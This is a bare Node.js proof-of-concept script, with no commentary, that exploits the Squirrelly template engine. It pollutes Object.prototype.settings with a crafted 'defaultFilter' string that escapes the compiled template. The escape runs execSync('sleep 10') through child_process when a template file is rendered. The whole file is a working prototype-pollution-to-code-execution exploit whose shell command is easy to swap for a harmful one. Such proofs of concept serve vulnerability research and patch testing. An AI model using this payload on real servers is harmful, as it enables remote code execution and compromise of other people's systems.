var sqrl = require('squirrelly')
const path = require('path')


templatePath = path.join(__dirname+'/views/', 'each.sqrl');

Object.prototype.settings = {
   'view options':{
      'defaultFilter': "e')); global.process.mainModule.require('child_process').execSync('sleep 10');return tR;}}, params:[it.kids]})\n//",
   }
};

sqrl.renderFile(templatePath, { kids: ['Ben', 'Polly', 'Joel', 'Phronsie', 'Davie'] });